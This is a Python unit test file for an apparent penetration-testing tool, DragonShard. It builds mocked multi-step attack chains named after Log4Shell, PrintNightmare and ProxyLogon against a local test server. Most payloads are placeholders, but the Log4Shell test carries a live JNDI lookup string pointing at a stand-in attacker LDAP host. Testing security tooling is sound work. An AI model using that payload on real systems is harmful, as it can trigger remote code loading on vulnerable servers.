#!/usr/bin/env python3
"""
Unit tests for DragonShard Executor Stress Test Scenarios
Tests complex multi-step vulnerabilities (2, 3, and 4 steps)
Combines code vulnerabilities with CVE patterns
"""

import json
import time
import unittest
from dataclasses import asdict
from unittest.mock import MagicMock, Mock, patch

from dragonshard.api_inference.unified_crawler import UnifiedCrawler
from dragonshard.executor.executor import AttackExecutor, ExecutionResult, ExecutionStatus
from dragonshard.executor.session_manager import (
    AuthCredentials,
    AuthMethod,
    SessionManager,
    SessionState,
)
from dragonshard.executor.state_graph import HostStatus, ServiceType, StateGraph, VulnerabilityLevel
from dragonshard.fuzzing.fuzzer import Fuzzer
from dragonshard.planner.chain_planner import (
    AttackChain,
    AttackComplexity,
    AttackImpact,
    AttackStep,
    AttackType,
)


class TestExecutorStressScenarios(unittest.TestCase):
    """Test complex multi-step vulnerability scenarios for the executor module"""

    def setUp(self):
        """Set up test fixtures"""
        self.fuzzer = Mock(spec=Fuzzer)
        self.crawler = Mock(spec=UnifiedCrawler)
        self.executor = AttackExecutor()
        self.session_manager = SessionManager()
        self.state_graph = StateGraph()

    def test_2_step_log4shell_scenario(self):
        """Test 2-step Log4Shell (CVE-2021-44228) scenario"""
        # Step 1: Authentication bypass
        auth_step1 = AttackStep(
            step_id="auth_bypass",
            step_name="Authentication Bypass",
            attack_type=AttackType.AUTHENTICATION_BYPASS,
            target_url="http://localhost:8085/api/v1/login",
            payload="admin:admin123",
            expected_outcome="Authentication successful",
            success_criteria="200 response with success status",
        )

        # Step 2: Log injection with JNDI lookup
        auth_step2 = AttackStep(
            step_id="log_injection",
            step_name="Log Injection",
            attack_type=AttackType.TEMPLATE_INJECTION,
            target_url="http://localhost:8085/api/v1/log",
            payload="${jndi:ldap://attacker.com/exploit}",
            expected_outcome="Log injection successful",
            success_criteria="200 response with success status",
        )

        auth_chain = AttackChain(
            chain_id="log4shell_auth",
            chain_name="Log4Shell Authentication",
            description="Authentication bypass for Log4Shell exploitation",
            target_host="localhost:8085",
            attack_steps=[auth_step1, auth_step2],
            total_impact=AttackImpact.CRITICAL,
            total_complexity=AttackComplexity.MEDIUM,
            success_probability=0.8,
            estimated_duration=30,
        )

        # Mock successful execution
        with patch.object(self.executor, "_execute_step") as mock_execute:
            mock_execute.return_value = Mock(
                status=ExecutionStatus.COMPLETED,
                result=ExecutionResult.SUCCESS,
                response_code=200,
                response_time=0.1,
                execution_time=0.1,
            )

            # Execute the chain
            result = self.executor.execute_attack_chain(auth_chain)

            self.assertEqual(result.status, ExecutionStatus.COMPLETED)
            self.assertEqual(result.completed_steps, 2)
            self.assertEqual(result.failed_steps, 0)

    def test_3_step_printnightmare_scenario(self):
        """Test 3-step PrintNightmare (CVE-2021-34527) scenario"""
        # Step 1: Print spooler discovery
        discovery_step = AttackStep(
            step_id="discovery",
            step_name="Service Discovery",
            attack_type=AttackType.SSRF,
            target_url="http://localhost:8085/api/v2/discover",
            payload="192.168.1.100",
            expected_outcome="Service discovered",
            success_criteria="200 response with service info",
        )

        # Step 2: Authentication
        auth_step = AttackStep(
            step_id="auth",
            step_name="Authentication",
            attack_type=AttackType.AUTHENTICATION_BYPASS,
            target_url="http://localhost:8085/api/v2/auth",
            payload="printadmin:print123",
            expected_outcome="Authentication successful",
            success_criteria="200 response with auth token",
        )

        # Step 3: Exploitation
        exploit_step = AttackStep(
            step_id="exploit",
            step_name="Print Spooler Exploitation",
            attack_type=AttackType.REMOTE_CODE_EXECUTION,
            target_url="http://localhost:8085/api/v2/exploit",
            payload="exploit_hash",
            expected_outcome="Exploitation successful",
            success_criteria="200 response with exploit result",
        )

        printnightmare_chain = AttackChain(
            chain_id="printnightmare_chain",
            chain_name="PrintNightmare Exploitation",
            description="PrintNightmare exploitation chain",
            target_host="localhost:8085",
            attack_steps=[discovery_step, auth_step, exploit_step],
            total_impact=AttackImpact.CRITICAL,
            total_complexity=AttackComplexity.HIGH,
            success_probability=0.7,
            estimated_duration=45,
        )

        # Mock successful execution
        with patch.object(self.executor, "_execute_step") as mock_execute:
            mock_execute.return_value = Mock(
                status=ExecutionStatus.COMPLETED,
                result=ExecutionResult.SUCCESS,
                response_code=200,
                response_time=0.2,
                execution_time=0.2,
            )

            # Execute the chain
            result = self.executor.execute_attack_chain(printnightmare_chain)

            self.assertEqual(result.status, ExecutionStatus.COMPLETED)
            self.assertEqual(result.completed_steps, 3)
            self.assertEqual(result.failed_steps, 0)

    def test_4_step_proxylogon_scenario(self):
        """Test 4-step ProxyLogon (CVE-2021-26855) scenario"""
        # Step 1: Exchange discovery
        discovery_step = AttackStep(
            step_id="exchange_discovery",
            step_name="Exchange Discovery",
            attack_type=AttackType.SSRF,
            target_url="http://localhost:8085/api/v3/discover_exchange",
            payload="192.168.1.100",
            expected_outcome="Exchange server discovered",
            success_criteria="200 response with exchange info",
        )

        # Step 2: Exchange authentication
        auth_step = AttackStep(
            step_id="exchange_auth",
            step_name="Exchange Authentication",
            attack_type=AttackType.AUTHENTICATION_BYPASS,
            target_url="http://localhost:8085/api/v3/exchange_auth",
            payload="admin@corp.local:exchange123",
            expected_outcome="Exchange authentication successful",
            success_criteria="200 response with exchange token",
        )

        # Step 3: SSRF
        ssrf_step = AttackStep(
            step_id="proxylogon_ssrf",
            step_name="ProxyLogon SSRF",
            attack_type=AttackType.SSRF,
            target_url="http://localhost:8085/api/v3/proxylogon_ssrf",
            payload="192.168.1.100",
            expected_outcome="SSRF successful",
            success_criteria="200 response with SSRF result",
        )

        # Step 4: RCE
        rce_step = AttackStep(
            step_id="proxylogon_rce",
            step_name="ProxyLogon RCE",
            attack_type=AttackType.REMOTE_CODE_EXECUTION,
            target_url="http://localhost:8085/api/v3/proxylogon_rce",
            payload="rce_payload",
            expected_outcome="RCE successful",
            success_criteria="200 response with RCE result",
        )

        proxylogon_chain = AttackChain(
            chain_id="proxylogon_chain",
            chain_name="ProxyLogon Exploitation",
            description="ProxyLogon exploitation chain",
            target_host="localhost:8085",
            attack_steps=[discovery_step, auth_step, ssrf_step, rce_step],
            total_impact=AttackImpact.CRITICAL,
            total_complexity=AttackComplexity.CRITICAL,
            success_probability=0.6,
            estimated_duration=60,
        )

        # Mock successful execution
        with patch.object(self.executor, "_execute_step") as mock_execute:
            mock_execute.return_value = Mock(
                status=ExecutionStatus.COMPLETED,
                result=ExecutionResult.SUCCESS,
                response_code=200,
                response_time=0.3,
                execution_time=0.3,
            )

            # Execute the chain
            result = self.executor.execute_attack_chain(proxylogon_chain)

            self.assertEqual(result.status, ExecutionStatus.COMPLETED)
            self.assertEqual(result.completed_steps, 4)
            self.assertEqual(result.failed_steps, 0)

    def test_concurrent_multi_step_execution(self):
        """Test concurrent execution of multiple multi-step scenarios"""
        # Create simplified chains for concurrent testing
        chains = []

        # 2-step chain
        step1 = AttackStep(
            step_id="step1",
            step_name="Step 1",
            attack_type=AttackType.AUTHENTICATION_BYPASS,
            target_url="http://localhost:8085/api/v1/login",
            payload="test_payload",
            expected_outcome="Success",
            success_criteria="200 response",
        )

        step2 = AttackStep(
            step_id="step2",
            step_name="Step 2",
            attack_type=AttackType.SQL_INJECTION,
            target_url="http://localhost:8085/api/v1/log",
            payload="test_payload",
            expected_outcome="Success",
            success_criteria="200 response",
        )

        chain1 = AttackChain(
            chain_id="chain1",
            chain_name="2-Step Chain",
            description="2-step attack chain",
            target_host="localhost:8085",
            attack_steps=[step1, step2],
            total_impact=AttackImpact.HIGH,
            total_complexity=AttackComplexity.MEDIUM,
            success_probability=0.8,
            estimated_duration=30,
        )

        chains.append(chain1)

        # 3-step chain
        step3 = AttackStep(
            step_id="step3",
            step_name="Step 3",
            attack_type=AttackType.XSS,
            target_url="http://localhost:8085/api/v2/discover",
            payload="test_payload",
            expected_outcome="Success",
            success_criteria="200 response",
        )

        chain2 = AttackChain(
            chain_id="chain2",
            chain_name="3-Step Chain",
            description="3-step attack chain",
            target_host="localhost:8085",
            attack_steps=[step1, step2, step3],
            total_impact=AttackImpact.HIGH,
            total_complexity=AttackComplexity.HIGH,
            success_probability=0.7,
            estimated_duration=45,
        )

        chains.append(chain2)

        # Mock successful execution
        with patch.object(self.executor, "_execute_step") as mock_execute:
            mock_execute.return_value = Mock(
                status=ExecutionStatus.COMPLETED,
                result=ExecutionResult.SUCCESS,
                response_code=200,
                response_time=0.1,
                execution_time=0.1,
            )

            # Execute all chains concurrently
            results = self.executor.execute_multiple_chains(chains)

            self.assertEqual(len(results), 2)
            for result in results:
                self.assertEqual(result.status, ExecutionStatus.COMPLETED)

    def test_session_management_integration(self):
        """Test session management with complex authentication scenarios"""
        # Test form authentication
        session_id = self.session_manager.create_session("localhost:8085")
        credentials = AuthCredentials(username="admin", password="admin123")
        auth_result = self.session_manager.authenticate_session(session_id, credentials)
        self.assertTrue(auth_result)

        # Test token authentication
        session_id2 = self.session_manager.create_session("localhost:8085")
        credentials2 = AuthCredentials(username="", password="", token="Bearer fake_token_123")
        token_result = self.session_manager.authenticate_session(session_id2, credentials2)
        self.assertTrue(token_result)

        # Test session persistence
        sessions = self.session_manager.get_all_sessions()
        self.assertGreaterEqual(len(sessions), 1)  # At least one session should exist
        # Check that at least one session is authenticated
        authenticated_sessions = [
            s for s in sessions if s.get("state") == SessionState.AUTHENTICATED.value
        ]
        self.assertGreater(len(authenticated_sessions), 0)

    def test_state_graph_integration(self):
        """Test state graph integration with complex scenarios"""
        # Add hosts and services to state graph
        host_id = self.state_graph.add_host("192.168.1.100", "Windows Server 2019")
        service1_id = self.state_graph.add_service(
            host_id, 3389, ServiceType.HTTPS, "Microsoft RDP"
        )
        service2_id = self.state_graph.add_service(host_id, 445, ServiceType.HTTPS, "Microsoft SMB")
        service3_id = self.state_graph.add_service(
            host_id, 443, ServiceType.HTTPS, "Microsoft Exchange"
        )
        service4_id = self.state_graph.add_service(
            host_id, 9443, ServiceType.HTTPS, "VMware vCenter"
        )

        # Add vulnerabilities
        self.state_graph.add_vulnerability(
            service1_id,
            "CVE-2019-0708",
            VulnerabilityLevel.CRITICAL,
            "BlueKeep",
            "RDP vulnerability",
        )
        self.state_graph.add_vulnerability(
            service2_id,
            "CVE-2021-34527",
            VulnerabilityLevel.CRITICAL,
            "PrintNightmare",
            "SMB vulnerability",
        )
        self.state_graph.add_vulnerability(
            service3_id,
            "CVE-2021-26855",
            VulnerabilityLevel.CRITICAL,
            "ProxyLogon",
            "Exchange vulnerability",
        )
        self.state_graph.add_vulnerability(
            service4_id,
            "CVE-2021-21972",
            VulnerabilityLevel.CRITICAL,
            "vCenter SSRF",
            "vCenter vulnerability",
        )

        # Test state graph summary
        vuln_summary = self.state_graph.get_vulnerability_summary()
        topology = self.state_graph.get_network_topology()

        self.assertIsInstance(vuln_summary, dict)
        self.assertIsInstance(topology, dict)
        self.assertIn("total_vulnerabilities", vuln_summary)
        self.assertIn("total_hosts", topology)  # Changed from "hosts" to "total_hosts"

    def test_export_capabilities(self):
        """Test export capabilities for stress test results"""
        # Test state graph export
        self.state_graph.export_graph("test_graph.json")
        # Check that file was created
        import os

        self.assertTrue(os.path.exists("test_graph.json"))
        # Clean up
        os.remove("test_graph.json")

        # Test session export
        self.session_manager.export_sessions("test_sessions.json")
        # Check that file was created
        self.assertTrue(os.path.exists("test_sessions.json"))
        # Clean up
        os.remove("test_sessions.json")

        # Test executor export (simplified)
        # Create a real execution step to avoid dataclass issues
        from dragonshard.executor.executor import ExecutionResult, ExecutionStatus, ExecutionStep

        real_step = ExecutionStep(
            step_id="test_step",
            step_name="Test Step",
            target_url="http://localhost:8085/test",
            payload="test_payload",
            status=ExecutionStatus.COMPLETED,
            result=ExecutionResult.SUCCESS,
            response_code=200,
            response_time=0.1,
            execution_time=0.1,
        )

        # Add the real step to executor history
        self.executor.execution_history.append(real_step)

        # Test export
        self.executor.export_execution_results("test_export.json")
        # Check that file was created
        self.assertTrue(os.path.exists("test_export.json"))
        # Clean up
        os.remove("test_export.json")


if __name__ == "__main__":
    unittest.main()
